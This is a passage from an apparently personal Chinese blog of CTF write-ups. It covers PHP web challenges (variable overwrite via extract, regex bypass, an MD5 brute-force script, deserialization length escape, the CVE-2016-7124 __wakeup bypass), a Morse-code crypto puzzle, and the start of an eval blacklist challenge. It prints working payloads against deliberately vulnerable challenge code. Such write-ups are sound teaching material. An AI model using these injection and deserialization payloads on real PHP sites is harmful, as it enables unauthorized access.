keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">qwq</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Access Denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">oao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^\-[a-e][^a-zA-Z0-8]&lt;b>(.*)>&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/'</span><span class="token punctuation">,</span> <span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Almost there."</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Input correct parameters"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token operator">===</span><span class="token variable">$SecretNumber</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Congratulations!"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$my_ans</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>有一个类，可能是反序列化，但看到最后<code>call_user_func</code>，类里面还有个static函数，应该是直接调用了。</p><p>看逻辑，<code>php://input</code>，变量<code>str</code>从POST原始流读取数据，过滤后变量覆盖。然后传入<code>shaw_root</code>，满足条件会给hint，最后<code>$ans===$SecretNumber</code>即可调用函数了。</p><hr><p>首先传<code>shaw_root</code>，第一个点在过滤了<code>_</code>，根据PHP特性，<code>空格</code>，<code>.</code>传递最后都会转变为<code>-</code></p><p>如图所示，此为web3的调试，与本题此考点一致</p><img src="/article/djbctf2021/image-20210128164708984.png" class="" title="image-20210128164708984" loading="lazy"><img src="/article/djbctf2021/image-20210128164811979.png" class="" title="image-20210128164811979" loading="lazy"><p>传入空格，<code>.</code>都变成了<code>_</code></p><p>接下来就是绕正则了，去regex101调了半天(没学正则的懒狗—–&gt;我)，调了一个payload</p><img src="/article/djbctf2021/image-20210128165252056.png" class="" title="image-20210128165252056" loading="lazy"><p><code>-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra</code></p><p>传入得</p><img src="/article/djbctf2021/image-20210128165654959.png" class="" title="image-20210128165654959" loading="lazy"><pre class="language-none"><code class="language-none">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</code></pre><p>写脚本爆破,脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/23 16:58@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">MD5</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">10000</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">"shaw&#123;&#125;root"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span>m<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token operator">==</span> target <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind it:'</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MD5<span class="token punctuation">(</span><span class="token string">'166b47a5cb1ca2431a0edfcef200684f'</span><span class="token punctuation">)</span></code></pre><p>爆破得<code>shaw21475root</code></p><img src="/article/djbctf2021/image-20210128170204123.png" class="" title="image-20210128170204123" loading="lazy"><p>传入成功</p><img src="/article/djbctf2021/image-20210128170309356.png" class="" title="image-20210128170309356" loading="lazy"><p>表明成功了，最后一步调用函数，根据PHP文档，类static函数可以直接用<code>class::static function</code>调用，详情见<a href="https://www.php.net/manual/zh/function.call-user-func.php">官方文档</a></p><p>最终payload:<code>shaw root=-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra&amp;&amp;ans=21475&amp;&amp;my ans=qwq::oao</code></p><img src="/article/djbctf2021/image-20210128170748201.png" class="" title="image-20210128170748201" loading="lazy"><p>这里要注意，如果用HackBar发包的话要换模式</p><img src="/article/djbctf2021/image-20210128170832793.png" class="" title="image-20210128170832793" loading="lazy"><p>因为转义是阻挡你前进步伐的一大元凶</p><h4 id="题目思考"><a href="#题目思考" class="headerlink" title="题目思考"></a>题目思考</h4><p>因为变量覆盖，直接把<code>SecretNumber</code>覆盖就行了，本题在<code>str</code>处有个过滤<code>e</code>，所以不行</p><p><code>php://input</code>读入原始流数据，所以取反异或转义之类的方法都是不行的</p><hr><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>Web签到题(大概)，源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token single-quoted-string string">'ctfshowvip'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'wrong password'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\_|\.|\]|\[/is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>标准反序列化长度逃逸，可惜非预期了</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>看<code>spaceman</code>类，两个变量由魔术方法<code>__construct</code>赋值，<code>filter</code>函数替换字符串，基本上就确定本题是反序列化长度逃逸了。</p><p>同样，<code>php://input</code>读取原始流数据变量覆盖，绕过方法同web1，构造反序列化</p><p><code>str_replace</code>将<code>ctfshowup</code>替换为<code>ctfshow</code>，也就是说原来9个字符变成了7个字符，有两个字符逃逸了。</p><p>我们的核心目标是将<code>password</code>覆盖为<code>ctfshowvip</code>，所以最后部分的序列化字符串应为<code>;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>，一共35个字符。</p><p>所以它原始生成的部分应该被覆盖的为<code>&quot;;s:8:&quot;password&quot;;s:35:</code>即22个字符，所以<code>username</code>应该填入11个<code>ctfshowup</code>来覆盖它</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user_name</span><span class="token operator">=</span><span class="token double-quoted-string string">"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup"</span><span class="token punctuation">;</span><span class="token variable">$pass_word</span><span class="token operator">=</span><span class="token double-quoted-string string">";s:8:\"password\";s:10:\"ctfshowvip\";&#125;"</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test = unserialize($ser);</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>最终payload</p><p><code>user name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;&amp;pass word=;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p><p>记得空格绕<code>_</code></p><img src="/article/djbctf2021/image-20210128173924844.png" class="" title="image-20210128173924844" loading="lazy"><h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>由于变量覆盖，直接覆盖<code>pass_word</code>即可</p><p>payload：<code>pass word=ctfshowvip</code></p><img src="/article/djbctf2021/image-20210128174153341.png" class="" title="image-20210128174153341" loading="lazy"><h4 id="题目思考-1"><a href="#题目思考-1" class="headerlink" title="题目思考"></a>题目思考</h4><p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong> </p><p>漏洞影响版本：</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>经典的反序列化长度逃逸的题目了</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="大佬们帮我看看我这个Python脚本为什么运行不了啊"><a href="#大佬们帮我看看我这个Python脚本为什么运行不了啊" class="headerlink" title="大佬们帮我看看我这个Python脚本为什么运行不了啊"></a>大佬们帮我看看我这个Python脚本为什么运行不了啊</h3><p>题目描述</p><pre class="language-none"><code class="language-none">菜鸡 9:36:27菜鸡上传了文件 新建文本文档.py菜鸡 9:37:02key1: Do you want a DaJiBei?菜鸡 9:37:61大佬们帮我看看我这个Python脚本为什么运行不了啊</code></pre><p>hint1:</p><pre class="language-none"><code class="language-none">最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式</code></pre><p>hint2:</p><pre class="language-none"><code class="language-none">为什么运行结果里好好的3，也要写成大小写混乱的样子？</code></pre><p>hint3:</p><pre class="language-none"><code class="language-none">如果某个方向已经找不到更多的线索，不妨回头看看来时的道路</code></pre><p>hint4:</p><pre class="language-none"><code class="language-none">本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？ 为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。</code></pre><p>hint5:</p><img src="/article/djbctf2021/hint.png" class="" title="hint.png" loading="lazy"><p>最终提示hint5直接点明摩斯密码</p><p>题目原件</p><pre class="language-python" data-language="python"><code class="language-python">fROM CRYPTO<span class="token punctuation">.</span>utIL<span class="token punctuation">.</span>NuMBER IMPORT BYteS_TO_LoNG<span class="token punctuation">,</span> long_TO_BYTESA_Fake_FLaG <span class="token operator">=</span> <span class="token string">B'FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;'</span>nuMBER <span class="token operator">=</span> bYTEs_tO_long<span class="token punctuation">(</span>a_FAKE_FLAG<span class="token punctuation">)</span>KeY1 <span class="token operator">=</span> <span class="token string">B'DO yOU WAnT A DAJIBEI?'</span>KEY1 <span class="token operator">=</span> Bytes_to_lONG<span class="token punctuation">(</span>KEY1<span class="token punctuation">)</span>KEY2 <span class="token operator">=</span> <span class="token number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span>iv <span class="token operator">=</span> <span class="token number">10800</span>KEY3 <span class="token operator">=</span> KeY2 <span class="token operator">*</span> IVIS_THIS_rEAL_FlAG <span class="token operator">=</span> <span class="token punctuation">(</span>NUmber <span class="token operator">+</span> kEY3<span class="token punctuation">)</span> <span class="token operator">//</span> KEy1<span class="token keyword">print</span><span class="token punctuation">(</span>long_tO_bytes<span class="token punctuation">(</span>IS_THis_REAl_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>《关于我的老师看到直接气死过去怎么办》</p><p>根据题目描述，把<code>key1</code>替换为<code>Do you want a DaJiBei?</code></p><p>调整好格式跑一遍，得到<code>thrEE_means_3</code>，尝试各种单表加密均无果，根据hint4，对原始文件进行尝试还是无果，最后比赛快结束了，放出直接提示hint5，尝试将全篇小写转换为<code>.</code>，大写转换为<code>-</code>解密，发现摩斯密码表并不是固定位数，怕是要爆破排列组合，放弃了。</p><p>赛后出题人 @cheyenne 指点，本题摩斯密码统一采用五位一组，由总数为245位可得。</p><p>由于本人python正在自学水平一般，套用之前写过的一套C的替换程序</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*@Time ： 2021/1/24 13:58@Auth ： gyy@Blog ：http://err0r.top*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>FILE <span class="token operator">*</span>fpw<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'A'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'a'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'z'</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>       n<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fpr<span class="token punctuation">,</span><span class="token operator">*</span>fpw<span class="token punctuation">;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpr<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't open!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpw<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't write!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span>fpr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>浓浓的菜鸡味~，跑出结果</p><pre class="language-none"><code class="language-none">.---- ----- ..--- .---- ----- ---.. ----. --... .---- ----- ...-- .---- ..--- ...-- ---.. ...-- -.... ----. ---.. -.... .---- ----- .---- .---- .---- ----- ----. ..... .---- ----- ----. .---- ----- .---- ----. --... .---- .---- ----- .---- .---- ..... ----. ..... ..... -.... .---- ..--- .....</code></pre><p>拿去解密得</p><pre class="language-none"><code class="language-none">1021089710312383698610111095109101971101159556125</code></pre><p>看到ascii码<code> 102 108 97 103</code>立马起了反应，这是<code>flag</code>的ascii码，所以是每两个或三个组合成一个字符</p><pre class="language-none"><code class="language-none">102 108 97 103 123 83 69 86 101 110 95 109 101 97 110 115 95 56 125</code></pre><p>最后得到flag：<code>flag&#123;SEVen_means_8&#125;</code></p><p>无限接近答案，但密码学爷爷太强了呜呜呜</p><hr><p>有些收获吧，如有问题希望大佬们斧正。2021一起学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021</title>
      <link href="article/2021/"/>
      <url>article/2021/</url>
      
        <content type="html"><![CDATA[<p align="center">展望2021</p><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020BMZctf-Writeup</title>
      <link href="article/bmzctf2020/"/>
      <url>article/bmzctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020BMZCTF-Write-up"><a href="#2020BMZCTF-Write-up" class="headerlink" title="2020BMZCTF Write-up"></a>2020BMZCTF Write-up</h2><p>随缘做了两道web</p><p>昵称：Err0r</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-ezeval"><a href="#WEB-ezeval" class="headerlink" title="WEB_ezeval"></a>WEB_ezeval</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'echo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'`'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'preg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'server'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'chr'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'html'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'md5'</span><span class="token 